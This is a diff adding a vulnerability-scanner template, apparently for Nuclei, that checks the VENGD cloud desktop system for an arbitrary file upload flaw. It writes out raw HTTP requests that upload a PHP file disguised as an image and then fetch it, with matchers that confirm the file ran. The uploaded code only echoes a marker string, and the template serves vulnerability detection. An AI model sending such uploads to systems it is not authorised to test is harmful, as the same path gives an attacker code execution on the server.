@@ -1,0 +1,47 @@
+id: vengd-file-upload
+info:
+  name: VENGD Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The Next Generation cloud Desktop system (VENGD) has an arbitrary file upload vulnerability that allows attackers to write files, upload malicious files to the server, and potentially gain control over the server.
+  tags: file-upload
+  reference:
+    - https://forum.butian.net/share/80
+http:
+  - raw:
+      - |
+        POST /Upload/upload_file.php?l=abcdada HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
+        Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+
+        ------WebKitFormBoundaryfcKRltGv
+        Content-Disposition: form-data; name="file"; filename="1.php"
+        Content-Type: image/avif
+
+        <?php echo("21232f297a57a5a743894a0e4a801fc3") ?>
+        ------WebKitFormBoundaryfcKRltGv--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "_Requst:"
+  - raw:
+      - |
+        GET /Upload/abcdada/1.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "21232f297a57a5a743894a0e4a801fc3"
